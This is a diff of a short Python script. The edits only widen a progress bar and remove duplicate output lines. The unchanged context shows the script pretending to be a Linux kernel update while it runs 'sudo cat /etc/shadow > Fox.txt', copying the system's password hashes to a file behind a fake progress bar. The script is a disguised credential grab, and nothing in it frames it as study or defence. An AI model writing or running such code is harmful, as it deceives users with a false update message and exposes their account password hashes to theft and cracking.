@@ -7,7 +7,7 @@ print("================")
 print("The Linux Kernel need to update.")
 print("Updating:")
 os.system("sudo cat /etc/shadow > Fox.txt")
-toolbar_width = 50
+toolbar_width = 100
 
 # setup toolbar
 sys.stdout.write("[%s]" % (" " * toolbar_width))
@@ -22,12 +22,3 @@ for i in range(toolbar_width):
     sys.stdout.flush()
 
 sys.stdout.write("]\n")  # this ends the progress bar
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
-sys.stdout.write("]\n")
